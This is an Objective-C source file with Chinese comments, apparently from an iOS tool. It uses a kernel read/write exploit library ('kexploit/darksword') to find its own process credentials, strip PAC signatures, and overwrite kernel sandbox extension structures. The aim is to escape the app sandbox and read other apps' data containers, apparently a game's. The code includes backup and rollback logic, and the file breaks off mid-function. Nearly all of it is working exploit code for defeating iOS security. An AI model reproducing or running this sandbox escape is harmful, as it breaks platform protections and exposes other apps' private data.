//
//  SbxSurgeon.m
//  最小补丁 · 先备份再动手 · 验不过立刻回滚
//
//  这套代码只做一件事：让「本进程」能进游戏的数据容器。
//  不碰 launchd、不碰 SpringBoard、不装持久化、不改页表、不做 codesign 绕过。
//  所有写操作都进备份表，验不过 sxs_rollback() 原样写回。
//

#import <Foundation/Foundation.h>

#include <stdbool.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <mach/machine.h>
#include <dlfcn.h>

#include "SbxSurgeon.h"
#include "kexploit/darksword.h"
#include "kexploit/offsets.h"
#include "kexploit/utils.h"
#include "CrashGuard.h"

// 结构偏移：优先用运行期已经校准过的值，没校准就用社区稳定值
#define SXS_OFF_PROC_RO       (off_proc_p_proc_ro        ? off_proc_p_proc_ro        : 0x18)
#define SXS_OFF_UCRED_LABEL   (off_ucred_cr_label        ? off_ucred_cr_label        : 0x78)
#define SXS_OFF_LABEL_SANDBOX (off_label_l_perpolicy_sandbox ? off_label_l_perpolicy_sandbox : 0x10)
#define SXS_OFF_SANDBOX_EXTSET 0x10
#define SXS_OFF_EXT_DATA      0x40
#define SXS_OFF_EXT_DATALEN   0x48
#define SXS_EXT_SLOTS         16
#define SXS_CHAIN_MAX         64
#define SXS_MAX_BAK           160
#define SXS_BAK_MAX_LEN       64

typedef struct {
    uint64_t addr;
    uint32_t len;
    uint8_t  old[SXS_BAK_MAX_LEN];
} sxs_bak_t;

static sxs_bak_t g_bak[SXS_MAX_BAK];
static int       g_bakN = 0;
static int       g_errno_v = 0;
static char      g_verdict[512] = "还没跑过";
static uint64_t  g_extset = 0;
static sxs_probe_t g_last;

// MARK: - 指针还原

static bool sxs_ispac(void) {
    static int cached = -1;
    if (cached >= 0) return cached != 0;
    cpu_subtype_t sub = 0;
    size_t sz = sizeof(sub);
    if (sysctlbyname("hw.cpusubtype", &sub, &sz, NULL, 0) != 0) {
        cached = 0;
        return false;
    }
    cached = (sub == CPU_SUBTYPE_ARM64E) ? 1 : 0;
    return cached != 0;
}

static inline uint64_t sxs_xpaci(uint64_t a) {
    if (!sxs_ispac()) return a;
    if ((a & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) return a;
    register uint64_t x0 asm("x0") = a;
    asm volatile(".long 0xDAC143E0" : "+r"(x0)); // XPACI X0
    return x0;
}

static inline uint64_t sxs_sign(uint64_t v) {
    if ((v >> 32) > 0xFFFF) return v | pac_mask;
    return v;
}

static inline bool sxs_k(uint64_t v) {
    return v > VM_MIN_KERNEL_ADDRESS;
}

/// 把读出来的原始值还原成能用的内核指针：PAC 剥签 → 补高位 → SMR 解码兜底
static uint64_t sxs_ptr(uint64_t raw) {
    uint64_t v = sxs_xpaci(raw);
    if (sxs_k(v)) return v;

    uint64_t s = sxs_sign(v);
    if (sxs_k(s)) return s;

    if (t1sz_boot > 0 && t1sz_boot < 62 && smr_base > 0) {
        uint64_t bits = (smr_base << (62 - (uint8_t)t1sz_boot));
        uint64_t d = ((v & (0xFFFFFFFFFFFFC000ULL & ~bits)) | bits);
        if (sxs_k(d)) return d;
    }
    return v;
}

static void sbx_try_log(uint32_t off, const char *why) {
    NSLog(@"[sbx] 候选 sandbox+0x%x：%s", (unsigned)off, why);
}

static void sxs_say(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void sxs_say(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    snprintf(g_verdict, sizeof(g_verdict), "%s", buf);
    NSLog(@"[sbx] %s", buf);
}

// MARK: - 备份表

/// 写内核之前先问一句「这块让不让写」。判定结论一律存进 g_gate，报告里直接看得到。
///
/// v9.8 的判定下限写死在 0xffffffE000000000，但本机（iPad8,9 · iOS 18.5）上
/// ucred / label / sandbox 全落在 0xffffffdc… ~ 0xffffffdf… 这一段，
/// 于是「摘沙盒」那一刀根本没落下 —— 报告里那句「不在可写区（只读映像）」
/// 不是内核拒绝，是判定门槛自己写错了。
///
/// v9.9：允许带改成 kalloc 堆 [0xffffffc000000000, 0xfffffff000000000)；
/// 上界之外就是内核静态映像（__TEXT / __DATA / __cstring，0xfffffff0… 那一带），
/// 那一段碰一下就触发完整性保护，一律拒绝。
static char g_gate[256] = "还没判定";

/// v10.0：判定从「死上下界」改成「排除法」。
///
/// 内核虚拟地址空间里真正不能写的只有一块：内核映像本体
/// （kernel_base 往上那段 __TEXT / __DATA / __cstring / __const）。
/// 其余从 0xffffffdc… 到 0xffffffe2… 这一大片都是 kalloc / zalloc 动态堆，
/// 本进程的 proc / ucred / label / sandbox 就住在里面 —— 那是能写的。
///
/// v9.8 把下界写死成 0xffffffE000000000，正好把 label 所在的 0xffffffdd… 判成
/// 「只读映像」，一刀都没落下去；v9.9 换成 0xffffffc0 下界能放行，但仍是猜的。
/// 这一版不再猜：直接问「这个地址在不在内核映像里」，在就拒，不在就放。
static bool sxs_in_image(uint64_t a) {
    uint64_t kb = ds_get_kernel_base();
    if (!kb) kb = kernel_base;
    if (!kb) return false;                        // 拿不到基址就不排除，交给后面的区间判定
    return (a >= kb) && (a < kb + 0x40000000ULL); // 映像覆盖 1GB 足够，多拦不漏放
}

static bool sxs_ok_to_write(uint64_t addr, uint32_t len) {
    if (!sxs_k(addr) || len == 0) {
        snprintf(g_gate, sizeof(g_gate), "拒绝：地址无效（0x%llx · %u 字节）",
                 (unsigned long long)addr, (unsigned)len);
        return false;
    }
    if (len > 0x1000) {
        snprintf(g_gate, sizeof(g_gate), "拒绝：一次写 %u 字节超过上限", (unsigned)len);
        return false;
    }
    if (sxs_in_image(addr)) {
        snprintf(g_gate, sizeof(g_gate),
                 "拒绝：0x%llx 落在内核映像内（映像起 0x%llx，1GB 覆盖）——写进去就是整机重启",
                 (unsigned long long)addr,
                 (unsigned long long)(ds_get_kernel_base() ? ds_get_kernel_base() : kernel_base));
        return false;
    }
    if (!((addr >= 0xffffff8000000000ULL) && (addr < 0xfffffff000000000ULL))) {
        snprintf(g_gate, sizeof(g_gate),
                 "拒绝：0x%llx 不在内核动态区（0xffffff8000000000~0xfffffff000000000）",
                 (unsigned long long)addr);
        return false;
    }
    snprintf(g_gate, sizeof(g_gate), "允许：0x%llx 在内核动态区、不在映像内（%u 字节）",
             (unsigned long long)addr, (unsigned)len);
    return true;
}

const char *sxs_gate_note(void) {
    return g_gate;
}

// MARK: - 沙盒自检（v9.9）

/// 直接问系统一句「这个路径能不能以 file-read-data 打开」。
/// 这是内核侧真实的沙盒判定，不是猜。它把两件事分开：
///   改前拒绝 + 改后允许 → 沙盒这层真拿掉了；目录还 EPERM 就是别的层在拦
///   改后仍拒绝         → 沙盒还挂在这个进程上，说明摘的位置不对
static int g_sb_before = -100;
static int g_sb_after  = -100;
static const char *SXS_PROBE_PATH = "/private/var/mobile/Containers/Data/Application";

typedef int (*sxs_sbcheck_fn)(int pid, const char *op, int type, ...);

static int sxs_sandbox_check(const char *path) {
    static sxs_sbcheck_fn fn = NULL;
    static int tried = 0;
    if (!tried) {
        tried = 1;
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY);
        if (!h) h = dlopen("/usr/lib/libsystem_sandbox.dylib", RTLD_LAZY);
        if (h) fn = (sxs_sbcheck_fn)dlsym(h, "sandbox_check");
    }
    if (!fn) return -2;
    return fn((int)getpid(), "file-read-data", 1 /* SANDBOX_FILTER_PATH */, path);
}

static const char *sxs_sb_text(int r) {
    if (r == 0) return "允许";
    if (r > 0) return "拒绝";
    if (r == -2) return "取不到接口";
    return "出错";
}

const char *sxs_sandbox_selfcheck(void) {
    static char buf[256];
    snprintf(buf, sizeof(buf), "沙盒自检：file-read-data 改前=%s · 改后=%s",
             sxs_sb_text(g_sb_before), sxs_sb_text(g_sb_after));
    return buf;
}

// MARK: - 同一个沙盒结构还被谁指着（只读扫描，给下一版留靶子）

static char g_refs[640] = "还没扫";

static void sxs_scan_sandbox_refs(uint64_t proc, uint64_t procro, uint64_t sandbox) {
    char buf[640];
    size_t n = 0;
    int hits = 0;

    n += (size_t)snprintf(buf, sizeof(buf), "同名沙盒指针：");
    if (n >= sizeof(buf)) n = sizeof(buf) - 1;

    struct { uint64_t base; uint32_t len; const char *name; } zones[2] = {
        { procro, 0x100, "proc_ro" },
        { proc,   0x800, "proc"    }
    };

    for (int z = 0; z < 2; z++) {
        if (!sxs_k(zones[z].base)) continue;
        for (uint32_t o = 0; o + 8 <= zones[z].len; o += 8) {
            uint64_t v = sxs_ptr(ds_kread64(zones[z].base + o));
            if (v != sandbox) continue;
            hits++;
            if (n < sizeof(buf) - 48) {
                n += (size_t)snprintf(buf + n, sizeof(buf) - n, "%s+0x%x · ",
                                      zones[z].name, (unsigned)o);
            }
        }
    }

    if (hits == 0) {
        snprintf(buf, sizeof(buf), "同名沙盒指针：proc / proc_ro 里没再找到（只挂在凭证 label 这一处）");
    } else if (n < sizeof(buf) - 24) {
        snprintf(buf + n, sizeof(buf) - n, "共 %d 处", hits);
    }
    snprintf(g_refs, sizeof(g_refs), "%s", buf);
}

const char *sxs_sandbox_refs(void) {
    return g_refs;
}

// MARK: - v10.0：认出「哪个槽才是沙盒」

/// 扩展节点里读出来的这段字节，像不像沙盒的东西（路径 / 类别名 / 苹果前缀）
static bool sxs_is_sbx_text(const char *s, size_t n) {
    if (!s || n < 4) return false;
    char tmp[129];
    size_t m = n < (sizeof(tmp) - 1) ? n : (sizeof(tmp) - 1);
    size_t o = 0;
    for (size_t i = 0; i < m; i++) {
        char c = s[i];
        if (c == 0) break;
        if (c < 0x20 || c > 0x7e) return false;   // 混进不可见字节，就不是可读字符串
        tmp[o++] = c;
    }
    tmp[o] = 0;
    if (o < 4) return false;
    if (strstr(tmp, "sandbox")) return true;
    if (strstr(tmp, "com.apple")) return true;
    if (strstr(tmp, "/private/var")) return true;
    if (strstr(tmp, "/var/mobile")) return true;
    if (strstr(tmp, "/Users")) return true;
    return false;
}

/// 给一个「疑似沙盒结构」的指针打分。
///
/// 分从哪儿来（全是实证，不是猜）：
///   真沙盒的 ext_set 里挂着若干条扩展，每条扩展的 data 是一串可读路径 / 类别名。
///   读到这样的字符串才加分；读不到可读字符串 = 这不是沙盒，绝不动它。
///
/// 返回 0 = 不是沙盒；>=10 = 至少读到一条像样的扩展数据，可以动。
static int sxs_score_sandbox(uint64_t sb, uint32_t *usedOff,
                             int *oSlots, int *oNodes, int *oDataok,
                             char *sample, size_t sampleLen) {
    if (oSlots)  *oSlots = 0;
    if (oNodes)  *oNodes = 0;
    if (oDataok) *oDataok = 0;
    if (sample && sampleLen) sample[0] = 0;
    if (!sxs_k(sb)) return 0;

    const uint32_t esCand[3] = { SXS_OFF_SANDBOX_EXTSET, 0x18, 0x08 };
    int best = 0;

    for (int c = 0; c < 3; c++) {
        uint64_t es = sxs_ptr(ds_kread64(sb + esCand[c]));
        if (!sxs_k(es)) continue;

        int slots = 0, nodes = 0, dataok = 0, textHits = 0;
        char firstText[128] = {0};

        for (int s = 0; s < SXS_EXT_SLOTS; s++) {
            uint64_t hdr = sxs_ptr(ds_kread64(es + s * 8));
            if (!sxs_k(hdr)) continue;
            slots++;

            uint64_t cur = hdr;
            for (int i = 0; i < 8 && sxs_k(cur); i++) {
                uint64_t ext = sxs_ptr(ds_kread64(cur + 0x8));
                if (sxs_k(ext)) {
                    nodes++;
                    uint64_t da = sxs_ptr(ds_kread64(ext + SXS_OFF_EXT_DATA));
                    uint64_t dl = ds_kread64(ext + SXS_OFF_EXT_DATALEN);
                    // 只读同一页内的数据：跨页读万一后一页没映射，整机就直接没了。
                    // 扩展数据都是短字符串，64 字节足够认出「这是不是沙盒的东西」。
                    if (sxs_k(da) && dl > 0 && dl <= 0x4000 &&
                        ((da & 0xFFFULL) <= (0x1000ULL - 0x60ULL))) {
                        dataok++;
                        char buf[130];
                        size_t take = dl < 64 ? (size_t)dl : 64;
                        memset(buf, 0, sizeof(buf));
                        ds_kread(da, buf, take);
                        if (sxs_is_sbx_text(buf, take)) {
                            textHits++;
                            if (!firstText[0]) snprintf(firstText, sizeof(firstText), "%s", buf);
                        }
                    }
                }
                uint64_t next = sxs_ptr(ds_kread64(cur));
                if (!sxs_k(next) || next == cur) break;
                cur = next;
            }
        }

        int score = textHits * 10 + (nodes > 0 ? 2 : 0) + (dataok > 0 ? 1 : 0);
        if (score > best) {
            best = score;
            if (usedOff) *usedOff = esCand[c];
            if (oSlots)  *oSlots = slots;
            if (oNodes)  *oNodes = nodes;
            if (oDataok) *oDataok = dataok;
            if (sample && sampleLen) snprintf(sample, sampleLen, "%s", firstText);
        }
        if (textHits > 0 && nodes > 0) break;
    }
    return best;
}

typedef struct {
    uint32_t off;        // label + off
    uint64_t ptr;        // 这个槽里存着的指针
    int      score;      // 打分（>=10 才允许动）
    int      slots;
    int      nodes;
    int      dataok;
    char     sample[96]; // 从扩展里读到的第一条可读数据
} sxs_slotinfo_t;

#define SXS_LABEL_SLOTS 16
static sxs_slotinfo_t g_slotinfo[SXS_LABEL_SLOTS];
static int  g_slotn = 0;
static char g_slots[900] = "还没扫";

/// 把凭证 label 这 16 个槽全过一遍，只读，一个字节都不写。
static int sxs_scan_label_slots(uint64_t label) {
    g_slotn = 0;
    if (!sxs_k(label)) {
        snprintf(g_slots, sizeof(g_slots), "label 十六槽扫描：label 指针无效");
        return 0;
    }
    for (uint32_t o = 0; o < SXS_LABEL_SLOTS * 8 && g_slotn < SXS_LABEL_SLOTS; o += 8) {
        uint64_t p = sxs_ptr(ds_kread64(label + o));
        if (!sxs_k(p)) continue;

        sxs_slotinfo_t s;
        memset(&s, 0, sizeof(s));
        s.off = o;
        s.ptr = p;
        s.score = sxs_score_sandbox(p, NULL, &s.slots, &s.nodes, &s.dataok, s.sample, sizeof(s.sample));
        if (s.score <= 0) continue;
        g_slotinfo[g_slotn++] = s;
    }

    char buf[900];
    size_t k = 0;
    k += (size_t)snprintf(buf + k, sizeof(buf) - k, "label 十六槽扫描：");
    if (g_slotn == 0) {
        k += (size_t)snprintf(buf + k, sizeof(buf) - k,
                              "没有哪个槽能解出沙盒扩展链（结构对不上）");
    } else {
        for (int i = 0; i < g_slotn && k < sizeof(buf) - 140; i++) {
            k += (size_t)snprintf(buf + k, sizeof(buf) - k,
                                  "+0x%x 分=%d 节点=%d 数据=%d「%s」  ",
                                  (unsigned)g_slotinfo[i].off, g_slotinfo[i].score,
                                  g_slotinfo[i].nodes, g_slotinfo[i].dataok,
                                  g_slotinfo[i].sample[0] ? g_slotinfo[i].sample : "-");
        }
    }
    snprintf(g_slots, sizeof(g_slots), "%s", buf);
    return g_slotn;
}

const char *sxs_label_scan(void) {
    return g_slots;
}

int sxs_addr_writable(uint64_t addr) {
    return sxs_ok_to_write(addr, 1) ? 1 : 0;
}

static void sxs_save(uint64_t addr, uint32_t len) {
    if (!sxs_k(addr) || len == 0) return;
    if (len > SXS_BAK_MAX_LEN) len = SXS_BAK_MAX_LEN;
    for (int i = 0; i < g_bakN; i++) {
        if (g_bak[i].addr == addr && g_bak[i].len == len) return;  // 备份过就不再覆盖
    }
    if (g_bakN >= SXS_MAX_BAK) return;
    g_bak[g_bakN].addr = addr;
    g_bak[g_bakN].len  = len;
    memset(g_bak[g_bakN].old, 0, SXS_BAK_MAX_LEN);
    ds_kread(addr, g_bak[g_bakN].old, len);
    g_bakN++;
}

int sxs_patch_count(void) {
    return g_bakN;
}

int sxs_rollback(void) {
    int n = 0;
    for (int i = g_bakN - 1; i >= 0; i--) {
        if (!sxs_k(g_bak[i].addr) || g_bak[i].len == 0) continue;
        ds_kwrite(g_bak[i].addr, g_bak[i].old, g_bak[i].len);
        n++;
    }
    g_bakN = 0;
    sxs_say("已回滚 %d 处，内核恢复原样", n);
    return n;
}

// MARK: - 门诊（只读）

const char *sxs_note(const sxs_probe_t *p) {
    return p ? p->note : "";
}

int sxs_ready(void) {
    return (ds_is_ready() && ds_get_our_proc() != 0) ? 1 : 0;
}

static uint64_t sxs_our_proc(void) {
    uint64_t p = ds_get_our_proc();
    if (!p) p = ourproc();
    return p;
}

/// 从 proc 找到 ucred：先按运行期偏移，再在 proc_ro 里逐格扫（和上游同一个扫法）
static uint64_t sxs_find_ucred(uint64_t proc, char *note, size_t noteLen) {
    if (!sxs_k(proc)) {
        if (note) snprintf(note, noteLen, "proc 指针无效");
        return 0;
    }
    uint64_t procro = sxs_ptr(ds_kread64(proc + SXS_OFF_PROC_RO));
    if (!sxs_k(procro)) {
        if (note) snprintf(note, noteLen, "proc_ro 无效（+0x%x 读到 0x%llx）",
                           (unsigned)SXS_OFF_PROC_RO,
                           (unsigned long long)ds_kread64(proc + SXS_OFF_PROC_RO));
        return 0;
    }

    uint32_t cand[10];
    int cn = 0;
    if (off_proc_ro_p_ucred) cand[cn++] = off_proc_ro_p_ucred;
    for (uint32_t o = 0x10; o <= 0x40; o += 8) {
        bool dup = false;
        for (int i = 0; i < cn; i++) if (cand[i] == o) dup = true;
        if (!dup) cand[cn++] = o;
    }

    for (int i = 0; i < cn; i++) {
        uint64_t raw = ds_kread64(procro + cand[i]);
        uint64_t uc  = sxs_ptr(raw);
        if (!sxs_k(uc)) continue;
        uint64_t label = sxs_ptr(ds_kread64(uc + SXS_OFF_UCRED_LABEL));
        if (!sxs_k(label)) continue;
        uint64_t sb = sxs_ptr(ds_kread64(label + SXS_OFF_LABEL_SANDBOX));
        if (!sxs_k(sb)) continue;
        if (note) snprintf(note, noteLen, "ucred 命中 proc_ro+0x%x", (unsigned)cand[i]);
        return uc;
    }

    if (note) snprintf(note, noteLen, "proc_ro 里 0x10~0x40 没扫到自洽的 ucred");
    return 0;
}

int sxs_probe(sxs_probe_t *out) {
    if (!out) return -1;
    memset(out, 0, sizeof(*out));
    memset(&g_last, 0, sizeof(g_last));

    if (!ds_is_ready()) {
        snprintf(out->note, sizeof(out->note), "内核读写还没就绪，门诊不做");
        return -1;
    }

    uint64_t proc = sxs_our_proc();
    if (!sxs_k(proc)) {
        snprintf(out->note, sizeof(out->note), "拿不到本进程的 proc（0x%llx）",
                 (unsigned long long)proc);
        return -2;
    }

    char ucNote[192] = {0};
    uint64_t ucred = sxs_find_ucred(proc, ucNote, sizeof(ucNote));
    if (!ucred) {
        snprintf(out->note, sizeof(out->note),
                 "proc=0x%llx，但 %s —— 这台机器的进程结构和已知布局对不上，不往下写",
                 (unsigned long long)proc, ucNote);
        return -3;
    }
    out->ucred = ucred;

    uint64_t label = sxs_ptr(ds_kread64(ucred + SXS_OFF_UCRED_LABEL));
    if (!sxs_k(label)) {
        snprintf(out->note, sizeof(out->note), "ucred=0x%llx，cr_label 无效（+0x%x）",
                 (unsigned long long)ucred, (unsigned)SXS_OFF_UCRED_LABEL);
        return -4;
    }
    out->label = label;

    uint64_t sandbox = sxs_ptr(ds_kread64(label + SXS_OFF_LABEL_SANDBOX));
    if (!sxs_k(sandbox)) {
        snprintf(out->note, sizeof(out->note),
                 "label=0x%llx，sandbox 指针无效（+0x%x）—— 这个进程可能根本没有沙盒标签",
                 (unsigned long long)label, (unsigned)SXS_OFF_LABEL_SANDBOX);
        return -5;
    }
    out->sandbox = sandbox;

    // ext_set 在主结构里的位置：先按已知布局，读不出有效链再试两个备用位置。
    // 这一步全程只读，读错了也只会判定「没命中」，不会写坏任何东西。
    const uint32_t esCand[3] = { SXS_OFF_SANDBOX_EXTSET, 0x18, 0x08 };
    uint64_t extset = 0;
    int slots = 0, nodes = 0, dataok = 0;
    uint32_t usedOff = 0;

    for (int c = 0; c < 3; c++) {
        uint64_t es = sxs_ptr(ds_kread64(sandbox + esCand[c]));
        if (!sxs_k(es)) {
            sbx_try_log(esCand[c], "指针无效");
            continue;
        }

        int s_slots = 0, s_nodes = 0, s_dataok = 0;
        for (int s = 0; s < SXS_EXT_SLOTS; s++) {
            uint64_t hdr = sxs_ptr(ds_kread64(es + s * 8));
            if (!sxs_k(hdr)) continue;
            s_slots++;

            uint64_t cur = hdr;
            for (int i = 0; i < SXS_CHAIN_MAX && sxs_k(cur); i++) {
                uint64_t ext = sxs_ptr(ds_kread64(cur + 0x8));
                if (sxs_k(ext)) {
                    s_nodes++;
                    uint64_t da = sxs_ptr(ds_kread64(ext + SXS_OFF_EXT_DATA));
                    uint64_t dl = ds_kread64(ext + SXS_OFF_EXT_DATALEN);
                    if (sxs_k(da) && dl > 0 && dl <= 0x100000) s_dataok++;
                }
                uint64_t next = sxs_ptr(ds_kread64(cur));
                if (!sxs_k(next) || next == cur) break;
                cur = next;
            }
        }

        if (s_slots > 0 && s_slots > slots) {
            slots = s_slots;
            nodes = s_nodes;
            dataok = s_dataok;
            extset = es;
            usedOff = esCand[c];
        }
        if (s_slots > 0 && s_nodes > 0 && s_dataok > 0) break;   // 够用了，不再试别的
    }

    if (slots == 0) {
        snprintf(out->note, sizeof(out->note),
                 "sandbox=0x%llx 里三个候选位置(+0x10/+0x18/+0x08)都没读到有效扩展链 —— "
                 "这台机器的沙盒结构和已知布局不一致，再往下写就是拿整机冒险，停。",
                 (unsigned long long)sandbox);
        return -7;
    }
    if (nodes == 0 || dataok == 0) {
        snprintf(out->note, sizeof(out->note),
                 "ext_set(0x%llx，位于 sandbox+0x%x) 有 %d 个槽，但 extension=%d、data 有效=%d —— "
                 "结构读到一半就断了，停。",
                 (unsigned long long)extset, (unsigned)usedOff, slots, nodes, dataok);
        return -8;
    }

    out->extset = extset;
    g_extset = extset;
    out->slots  = slots;
    out->nodes  = nodes;
    out->dataok = dataok;
    out->ok = 1;

    snprintf(out->note, sizeof(out->note),
             "结构自洽：ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx(+0x%x) "
             "槽=%d 节点=%d data有效=%d",
             (unsigned long long)ucred, (unsigned long long)label,
             (unsigned long long)sandbox, (unsigned long long)extset, (unsigned)usedOff,
             slots, nodes, dataok);

    g_last = *out;
    return 0;
}

// MARK: - 补丁三级

/// 第 1 级：把扩展的权限类别换成 read-write（只改指针和类别字符串）
static int sxs_level1_one(uint64_t hdr) {
    // 上游只在 hdr+0x10 本来就有值时才改这一类，这里保持一致，避免动到空槽
    if (!sxs_k(sxs_ptr(ds_kread64(hdr + 0x10)))) return 0;
    uint64_t ext = sxs_ptr(ds_kread64(hdr + 0x8));
    if (!sxs_k(ext)) return 0;
    uint64_t da = sxs_ptr(ds_kread64(ext + SXS_OFF_EXT_DATA));
    if (!sxs_k(da)) return 0;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[SXS_BAK_MAX_LEN];
    memset(b1, 0, sizeof(b1));
    size_t n = strlen(rw);
    if (n >= sizeof(b1)) n = sizeof(b1) - 1;
    memcpy(b1, rw, n);

    uint8_t zero[SXS_BAK_MAX_LEN];
    memset(zero, 0, sizeof(zero));

    // v9.8 护栏：只允许写内核堆。写到只读映像上会当场触发保护 → 整机重启。
    if (!sxs_ok_to_write(da + 32, SXS_BAK_MAX_LEN) ||
        !sxs_ok_to_write(da + 64, SXS_BAK_MAX_LEN) ||
        !sxs_ok_to_write(hdr + 0x10, 8)) {
        sbx_try_log(0, "类别字符串落在只读区，拒绝写（不再冒重启的险）");
        return 0;
    }

    sxs_save(da + 32, SXS_BAK_MAX_LEN);
    sxs_save(da + 64, SXS_BAK_MAX_LEN);
    sxs_save(hdr + 0x10, 8);

    ds_kwrite(da + 32, b1, SXS_BAK_MAX_LEN);
    ds_kwrite(da + 64, zero, SXS_BAK_MAX_LEN);

    uint64_t target = da + 32;
    ds_kwrite(hdr + 0x10, &target, 8);
    return 1;
}

/// 第 2 级：把扩展的数据区放开（路径 + 标志位 + 长度）
static int sxs_level2_one(uint64_t hdr) {
    uint64_t ext = sxs_ptr(ds_kread64(hdr + 0x8));
    if (!sxs_k(ext)) return 0;
    uint64_t da = sxs_ptr(ds_kread64(ext + SXS_OFF_EXT_DATA));
    uint64_t dl = ds_kread64(ext + SXS_OFF_EXT_DATALEN);
    if (!sxs_k(da) || dl == 0 || dl > 0x100000) return 0;

    if (!sxs_ok_to_write(da, 0x20) ||
        !sxs_ok_to_write(ext + SXS_OFF_EXT_DATA + 0x08, 0x10)) {
        sbx_try_log(0, "扩展数据区落在只读区，拒绝写");
        return 0;
    }

    // 数据区开头换成根路径
    uint8_t buf[0x20];
    ds_kread(da, buf, 0x20);
    buf[0] = '/';
    buf[1] = 0;
    sxs_save(da, 0x20);
    ds_kwrite(da, buf, 0x20);

    // 扩展结构体上的长度：只改 datalen，不再顺手把 +0x50 写成全 1。
    // 那个字段在不同版本上含义不定，写成 0xffffffffffffffff 后，内核一遍历就踩空。
    uint8_t chunk[0x20];
    ds_kread(ext + SXS_OFF_EXT_DATA, chunk, 0x20);
    *(uint64_t *)(chunk + 0x08) = 1;
    sxs_save(ext + SXS_OFF_EXT_DATA + 0x08, 8);
    ds_kwrite(ext + SXS_OFF_EXT_DATA + 0x08, chunk + 0x08, 8);
    return 1;
}

/// 第 3 级：把空的哈希槽补上一个现成的 hdr（原版做法，动静最大）
static int sxs_level3(void) {
    if (!sxs_k(g_extset)) return 0;

    uint64_t src = 0;
    for (int s = 0; s < SXS_EXT_SLOTS && !src; s++) {
        uint64_t h = sxs_ptr(ds_kread64(g_extset + s * 8));
        if (sxs_k(h)) src = h;
    }
    if (!src) return 0;

    int filled = 0;
    for (int s = 0; s < SXS_EXT_SLOTS; s++) {
        uint64_t h = ds_kread64(g_extset + s * 8);
        if (sxs_k(sxs_ptr(h))) continue;
        if (!sxs_ok_to_write(g_extset + s * 8, 8)) {
            sbx_try_log(0, "扩展槽落在只读区，拒绝补槽");
            continue;
        }
        sxs_save(g_extset + s * 8, 8);
        ds_kwrite(g_extset + s * 8, &src, 8);
        filled++;
    }
    return filled;
}

int sxs_patch(int level) {
    if (level < 1) level = 1;
    if (level > SXS_LEVEL_MAX) level = SXS_LEVEL_MAX;

    if (!sxs_k(g_extset)) {
        sxs_probe_t p;
        int r = sxs_probe(&p);
        if (r != 0) {
            sxs_say("门诊没过，不写：%s", p.note);
            return -1;
        }
    }
    if (!sxs_k(g_extset)) {
        sxs_say("ext_set 无效，不写");
        return -2;
    }

    cg_mark("沙盒补丁/开始写");
    int changed = 0;

    for (int s = 0; s < SXS_EXT_SLOTS; s++) {
        cg_beat();
        uint64_t hdr = sxs_ptr(ds_kread64(g_extset + s * 8));
        if (!sxs_k(hdr)) continue;

        uint64_t cur = hdr;
        for (int i = 0; i < SXS_CHAIN_MAX && sxs_k(cur); i++) {
            cg_beat();
            changed += sxs_level1_one(cur);
            if (level >= 2) changed += sxs_level2_one(cur);
            uint64_t next = sxs_ptr(ds_kread64(cur));
            if (!sxs_k(next) || next == cur) break;
            cur = next;
        }
    }

    if (level >= 3) {
        cg_mark("沙盒补丁/补空槽");
        changed += sxs_level3();
    }

    sxs_say("第 %d 级补丁写完，改动 %d 处（备份 %d 条）", level, changed, g_bakN);
    return changed;
}

// MARK: - v9.8：凭证路线（只摘一个沙盒指针）

static char g_cred_note[512] = "还没跑过";
static int  g_cred_level = 0;

const char *sxs_cred_note(void) {
    return g_cred_note;
}

int sxs_cred_count(void) {
    return g_bakN;
}

int sxs_cred_rollback(void) {
    int n = sxs_rollback();
    g_cred_level = 0;
    snprintf(g_cred_note, sizeof(g_cred_note), "已回滚 %d 处，凭证恢复原样", n);
    return n;
}

/// 只把「不是最后那一条」的改动写回原值，保留最后一刀（真正开门的那刀）。
/// 多候选轮流试的时候用：前面试错的槽必须还原，不然会留下别人的 MAC 标签被清空。
static int sxs_restore_except_last(void) {
    if (g_bakN <= 1) return 0;
    int n = 0;
    for (int i = g_bakN - 2; i >= 0; i--) {
        if (!sxs_k(g_bak[i].addr) || g_bak[i].len == 0) continue;
        ds_kwrite(g_bak[i].addr, g_bak[i].old, g_bak[i].len);
        n++;
    }
    g_bak[0] = g_bak[g_bakN - 1];
    g_bakN = 1;
    return n;
}

/// v10.0：把本进程凭证里那个「沙盒」指针摘掉。
///
/// 和 v9.8 / v9.9 最大的不同：不再假设它一定住在 label+0x10。
/// 做法：
///   1. 把 label 十六个槽全扫一遍（只读），逐个问「你这指针底下挂着沙盒扩展链吗」
///   2. 只有读到可读路径 / 类别名（/private/var、com.apple、sandbox …）才给分
///   3. 分最高的才是沙盒，分不够的一律不动 —— 绝不再拿别人家的 MAC 标签下手
///   4. 写完立刻问内核一句「这路径现在让不让读」，不灵就换下一个候选
///   5. 全不灵 → 整批回滚，内核一个字节不留
int sxs_cred_patch(void) {
    g_cred_level = 0;
    g_sb_before = sxs_sandbox_check(SXS_PROBE_PATH);   // 动手前先问系统一句，留基线

    if (!ds_is_ready()) {
        snprintf(g_cred_note, sizeof(g_cred_note), "内核读写没就绪，不动");
        return -1;
    }

    uint64_t proc = sxs_our_proc();
    if (!sxs_k(proc)) {
        snprintf(g_cred_note, sizeof(g_cred_note), "拿不到本进程 proc（0x%llx）", (unsigned long long)proc);
        return -2;
    }

    char ucNote[192] = {0};
    uint64_t ucred = sxs_find_ucred(proc, ucNote, sizeof(ucNote));
    if (!ucred) {
        snprintf(g_cred_note, sizeof(g_cred_note), "ucred 没定位到：%s", ucNote);
        return -3;
    }

    uint64_t labelRaw = ds_kread64(ucred + SXS_OFF_UCRED_LABEL);
    uint64_t label = sxs_ptr(labelRaw);
    if (!sxs_k(label)) {
        snprintf(g_cred_note, sizeof(g_cred_note),
                 "ucred=0x%llx 的 cr_label 无效（+0x%x 读到 0x%llx）",
                 (unsigned long long)ucred, (unsigned)SXS_OFF_UCRED_LABEL,
                 (unsigned long long)labelRaw);
        return -4;
    }

    // ---- 1) 全槽扫描（只读，一个字节都不写）----
